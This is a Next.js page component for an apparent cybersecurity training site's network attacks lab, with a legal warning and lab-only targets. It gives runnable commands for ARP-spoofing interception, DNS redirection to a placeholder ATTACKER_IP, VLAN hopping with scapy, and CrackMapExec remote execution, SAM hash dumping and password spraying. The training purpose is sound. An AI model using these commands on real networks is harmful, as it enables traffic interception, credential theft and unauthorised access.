'use client'
import React from 'react'
import Link from 'next/link'

const accent = '#00ffff'
const dim = '#5a7a7a'
const border = '#003a3a'

const Pre = ({ label, children }: { label?: string; children: string }) => (
  <div style={{ margin: '1rem 0 1.5rem' }}>
    {label && <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: dim, letterSpacing: '0.15em', marginBottom: '4px' }}>{label}</div>}
    <pre style={{ background: '#040404', border: '1px solid ' + border, borderRadius: '4px', padding: '1.25rem', overflow: 'auto', color: accent, fontFamily: 'JetBrains Mono, monospace', fontSize: '0.78rem', lineHeight: 1.7, whiteSpace: 'pre' as const }}>{children}</pre>
  </div>
)

const H2 = ({ children }: { children: React.ReactNode }) => (
  <h2 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.1rem', fontWeight: 600, color: accent, marginTop: '2.5rem', marginBottom: '0.75rem' }}>
    <span style={{ color: border, marginRight: '8px' }}>//</span>{children}
  </h2>
)

const P = ({ children }: { children: React.ReactNode }) => (
  <p style={{ color: '#8a9a8a', lineHeight: 1.8, marginBottom: '1rem', fontSize: '0.9rem' }}>{children}</p>
)

const Note = ({ children }: { children: React.ReactNode }) => (
  <div style={{ background: 'rgba(0,255,255, 0.06)', border: '1px solid rgba(0,255,255, 0.25)', borderRadius: '6px', padding: '1rem 1.25rem', marginBottom: '1.5rem' }}>
    <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: accent, letterSpacing: '0.15em', marginBottom: '6px' }}>BEGINNER NOTE</div>
    <p style={{ color: '#8a9a9a', fontSize: '0.82rem', lineHeight: 1.7, margin: 0 }}>{children}</p>
  </div>
)

export default function NetworkAttacksLab() {
  return (
    <div style={{ minHeight: '100vh', background: '#020c02', color: '#c8d8c8', fontFamily: 'system-ui, sans-serif', padding: '2rem' }}>
      <div style={{ maxWidth: '860px', margin: '0 auto' }}>

        <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.72rem', color: dim, marginBottom: '2rem', letterSpacing: '0.1em' }}>
          <Link href="/" style={{ color: dim, textDecoration: 'none' }}>GHOSTNET</Link>
          <span style={{ margin: '0 0.5rem' }}>&gt;</span>
          <Link href="/modules/network-attacks" style={{ color: dim, textDecoration: 'none' }}>NETWORK ATTACKS</Link>
          <span style={{ margin: '0 0.5rem' }}>&gt;</span>
          <span style={{ color: accent }}>LAB</span>
        </div>

        <div style={{ marginBottom: '2.5rem' }}>
          <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.7rem', color: dim, letterSpacing: '0.2em', marginBottom: '0.5rem' }}>HANDS-ON LAB</div>
          <h1 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '2rem', fontWeight: 700, color: accent, margin: 0 }}>Network Attacks Lab</h1>
          <p style={{ color: '#6a8a6a', marginTop: '0.75rem', fontSize: '0.9rem' }}>
            Packet analysis, ARP spoofing, DNS redirection, and lateral movement — on networks you own.{' '}
            <Link href="/modules/network-attacks" style={{ color: accent, textDecoration: 'none' }}>Back to Concept &rarr;</Link>
          </p>
        </div>

        <div style={{ background: '#040f04', border: '1px solid ' + border, borderRadius: '8px', padding: '1.5rem', marginBottom: '2rem' }}>
          <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.72rem', color: dim, letterSpacing: '0.15em', marginBottom: '0.75rem' }}>LAB OVERVIEW</div>
          <P>Practice packet analysis, ARP spoofing, and network scanning in a controlled lab environment. You will need: a Kali Linux VM, a second VM for the target (Metasploitable2 recommended), Wireshark, nmap, arpspoof or bettercap, and dnschef.</P>
          <div style={{ background: 'rgba(255,80,80,0.06)', border: '1px solid rgba(255,80,80,0.2)', borderRadius: '4px', padding: '0.75rem 1rem', marginTop: '0.75rem' }}>
            <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.72rem', color: '#ff5050' }}>LEGAL WARNING — </span>
            <span style={{ fontSize: '0.82rem', color: '#8a7a7a' }}>Only perform these exercises on networks and systems you own or have explicit written permission to test. Unauthorized scanning and interception is illegal in most jurisdictions.</span>
          </div>
        </div>

        <H2>01 — Wireshark Baseline Capture</H2>
        <P>Launch Wireshark on your lab interface and apply filters to isolate HTTP traffic and TCP SYN packets. Save the capture as a baseline you can reference throughout the lab.</P>
        <Note>Wireshark can feel overwhelming at first. The key is display filters — typing "http" into the filter bar instantly hides everything else. Start simple and add conditions as you need them. tshark is the terminal version and is useful for scripting captures.</Note>
        <Pre label="// EXERCISE 1 — CAPTURE AND FILTER TRAFFIC">{`# Start Wireshark on your interface:
sudo wireshark &

# Or use tshark from terminal:
sudo tshark -i eth0 -w baseline.pcap

# Stop after 60 seconds automatically:
sudo tshark -i eth0 -a duration:60 -w baseline.pcap

# Read the capture and show HTTP requests:
tshark -r baseline.pcap -Y "http.request" -T fields -e http.host -e http.request.uri

# Show all unique source IPs:
tshark -r baseline.pcap -T fields -e ip.src | sort -u

# Filter only SYN packets (port scans look like a flood of these):
tshark -r baseline.pcap -Y "tcp.flags.syn==1 && tcp.flags.ack==0"

# Count packets per protocol:
tshark -r baseline.pcap -q -z io,phs

# Expected output (HTTP filter):
# 192.168.1.10  /login.php
# 192.168.1.10  /api/auth
# 192.168.1.15  /images/logo.png`}</Pre>

        <H2>02 — Nmap Network Discovery</H2>
        <P>Map the network, identify live hosts, enumerate open ports, and fingerprint services and operating systems using nmap.</P>
        <Note>Always start with a ping sweep (-sn) to find live hosts before running a full port scan. Scanning all 65535 ports against every IP on a subnet takes a very long time — target specific hosts once you identify them.</Note>
        <Pre label="// EXERCISE 2 — MAP THE NETWORK">{`# Step 1: Find live hosts on your subnet:
sudo nmap -sn 192.168.1.0/24

# Expected: list of IPs that respond to ping
# 192.168.1.1   (gateway)
# 192.168.1.10  (target VM)

# Step 2: Full port scan on target:
sudo nmap -p- -T4 192.168.1.10

# Step 3: Service and version detection:
sudo nmap -sV -sC 192.168.1.10

# Step 4: OS detection (requires root):
sudo nmap -O 192.168.1.10

# Step 5: All-in-one scan, save results to multiple formats:
sudo nmap -sV -sC -O -T4 -oA target_scan 192.168.1.10

# View results:
cat target_scan.nmap

# Expected output snippet:
# PORT   STATE SERVICE VERSION
# 21/tcp open  ftp     vsftpd 2.3.4
# 22/tcp open  ssh     OpenSSH 4.7p1
# 80/tcp open  http    Apache httpd 2.2.8`}</Pre>

        <H2>03 — ARP Spoofing and Traffic Interception</H2>
        <P>Perform a man-in-the-middle attack by poisoning the ARP caches on both the target and the gateway. Traffic flows through your Kali machine where you can capture and analyse it.</P>
        <Note>IP forwarding is critical. If you forget to enable it, the target loses connectivity and the attack becomes immediately obvious. Always enable forwarding before starting arpspoof. When you are done, reset it and stop arpspoof so the ARP tables can recover.</Note>
        <Pre label="// EXERCISE 3 — ARP SPOOF AND CAPTURE TRAFFIC">{`# Prerequisites: Two VMs on same network
# Attacker: Kali Linux (192.168.1.5)
# Target: Metasploitable2 (192.168.1.10)
# Gateway: 192.168.1.1

# Step 1: Enable IP forwarding (critical — without this traffic stops):
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
# Verify: cat /proc/sys/net/ipv4/ip_forward should print 1

# Step 2: Start ARP spoofing (run both in separate terminals):
# Terminal 1 — tell target "I am the gateway":
sudo arpspoof -i eth0 -t 192.168.1.10 192.168.1.1

# Terminal 2 — tell gateway "I am the target":
sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.10

# Step 3: Start capturing on Kali:
sudo tcpdump -i eth0 host 192.168.1.10 -w mitm_capture.pcap

# Step 4: On target VM, browse to any HTTP site or FTP server

# Step 5: Stop capture, analyse in Wireshark or tshark:
tshark -r mitm_capture.pcap -Y "http.request.method == POST"

# Clean up — stop arpspoof with Ctrl+C in each terminal
# Reset forwarding:
echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward`}</Pre>

        <H2>04 — DNS Spoofing with dnschef</H2>
        <P>Redirect DNS queries from the target to an IP address you control. Combined with ARP spoofing, this creates a complete DNS hijack capable of redirecting any domain to a server you run.</P>
        <Pre label="// EXERCISE 4 — REDIRECT DNS QUERIES">{`# Install dnschef:
sudo pip install dnschef

# Step 1: Start dnschef to redirect a specific domain to your IP:
# Replace ATTACKER_IP with your Kali VM's IP address
sudo dnschef --fakedomains=testsite.com --fakeip=ATTACKER_IP --interface=0.0.0.0

# Step 2: On target, point DNS to your Kali IP:
# For lab testing: manually set DNS server on target to ATTACKER_IP
# In a real engagement: combine with ARP spoof to intercept DNS automatically

# Step 3: On target machine, resolve testsite.com:
nslookup testsite.com

# Expected output on target:
# Server: ATTACKER_IP
# Address: ATTACKER_IP#53
# Non-authoritative answer:
# Name: testsite.com
# Address: ATTACKER_IP

# Step 4: Host a fake page on Kali (simple Python server):
echo "<h1>Fake Site</h1>" > /tmp/index.html
cd /tmp && python3 -m http.server 80

# Step 5: Target browsing to testsite.com now hits your server
# Watch dnschef terminal output for all incoming DNS queries`}</Pre>

        <H2>05 — VLAN Hopping with Scapy</H2>
        <P>Craft double-tagged 802.1Q frames to escape a VLAN boundary. This attack works when the switch native VLAN is also used as a data VLAN, causing the outer tag to be stripped and the inner tag to forward the frame to a different VLAN.</P>
        <Note>VLAN hopping only works in specific switch configurations. In your lab, use GNS3 or a physical managed switch with a trunk port where native VLAN 1 is also used for data traffic. This is typically a one-way attack — you can send but responses do not return the same way.</Note>
        <Pre label="// EXERCISE 5 — DOUBLE-TAGGED PACKET CRAFTING">{`# Install scapy:
pip install scapy

# Launch Python with scapy:
sudo python3
from scapy.all import *

# Set your interface:
conf.iface = "eth0"

# Craft a double-tagged frame (VLAN hopping):
# Outer tag = native VLAN (VLAN 1)
# Inner tag = target VLAN (VLAN 10)
packet = Ether(dst="ff:ff:ff:ff:ff:ff") / Dot1Q(vlan=1) / Dot1Q(vlan=10) / IP(dst="10.10.0.1") / ICMP()

# Send the packet:
sendp(packet, iface="eth0", verbose=True)

# Send multiple packets:
sendp(packet, iface="eth0", count=3, inter=0.5)

# Craft ARP who-has over double tag to discover hosts in target VLAN:
arp_pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / Dot1Q(vlan=1) / Dot1Q(vlan=10) / ARP(pdst="10.10.0.0/24")
ans, unans = srp(arp_pkt, iface="eth0", timeout=2)

for sent, received in ans:
    print("Found host: " + received.psrc + " at " + received.hwsrc)`}</Pre>

        <H2>06 — Lateral Movement with CrackMapExec</H2>
        <P>Enumerate SMB shares and hosts across a subnet, test credentials, execute remote commands, and dump credential hashes from Windows targets that have been compromised.</P>
        <Pre label="// EXERCISE 6 — SMB ENUMERATION AND LATERAL MOVEMENT">{`# Install CrackMapExec:
pip install crackmapexec

# Step 1: Scan subnet for SMB hosts:
cme smb 192.168.1.0/24

# Expected output:
# SMB 192.168.1.10 445 METASPLOITABLE [*] Windows 6.1 Build 7601
# SMB 192.168.1.20 445 WIN-TARGET    [*] Windows 10.0 Build 19041

# Step 2: List shares with no credentials:
cme smb 192.168.1.10 --shares

# Step 3: Test a credential pair:
cme smb 192.168.1.10 -u administrator -p Password123

# Success marker: [+] means the login worked
# Failure marker: [-] means the login failed

# Step 4: Execute a command on a successful login:
cme smb 192.168.1.10 -u administrator -p Password123 -x "whoami"
cme smb 192.168.1.10 -u administrator -p Password123 -x "ipconfig"

# Step 5: Dump SAM hashes (requires administrator privileges):
cme smb 192.168.1.10 -u administrator -p Password123 --sam

# Step 6: Password spray across the entire subnet:
cme smb 192.168.1.0/24 -u administrator -p Password123 --continue-on-success`}</Pre>

        <H2>Check Your Understanding</H2>
        <div style={{ display: 'flex', flexDirection: 'column', gap: '0.75rem', marginBottom: '2rem' }}>
          {[
            '1. What nmap flag enables OS detection, and why does it require root privileges to work?',
            '2. Why must IP forwarding be enabled on the attacker machine before running ARP spoofing?',
            '3. What is the difference between ARP poisoning and DNS spoofing? How are they typically combined?',
            '4. What specific switch configuration makes VLAN hopping possible, and how is it mitigated by network admins?',
            '5. What do the [+] and [-] markers in CrackMapExec output mean, and what is the risk of credential spraying?',
          ].map((q, i) => (
            <div key={i} style={{ background: '#040f04', border: '1px solid ' + border, borderRadius: '4px', padding: '0.85rem 1rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.8rem', color: '#7a9a7a' }}>{q}</div>
          ))}
        </div>

        <H2>Further Practice</H2>
        <div style={{ display: 'flex', flexDirection: 'column', gap: '0.5rem', marginBottom: '3rem' }}>
          {[
            { label: 'TryHackMe — Wireshark: The Basics', url: 'https://tryhackme.com/room/wiresharkthebasics' },
            { label: 'TryHackMe — Nmap (Further Nmap)', url: 'https://tryhackme.com/room/furthernmap' },
            { label: 'TryHackMe — Networking Pre-Security Path', url: 'https://tryhackme.com/path/outline/presecurity' },
            { label: 'HTB Academy — Network Enumeration with Nmap', url: 'https://academy.hackthebox.com/module/details/19' },
          ].map((r, i) => (
            <a key={i} href={r.url} target="_blank" rel="noopener noreferrer" style={{ display: 'block', background: '#040f04', border: '1px solid ' + border, borderRadius: '4px', padding: '0.75rem 1rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.78rem', color: accent, textDecoration: 'none' }}>
              &rarr; {r.label}
            </a>
          ))}
        </div>

        <div style={{ borderTop: '1px solid ' + border, paddingTop: '1.5rem', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
          <Link href="/modules/network-attacks" style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.78rem', color: dim, textDecoration: 'none' }}>&larr; Back to Concept</Link>
          <Link href="/modules" style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.78rem', color: accent, textDecoration: 'none' }}>All Modules &rarr;</Link>
        </div>

      </div>
    </div>
  )
}
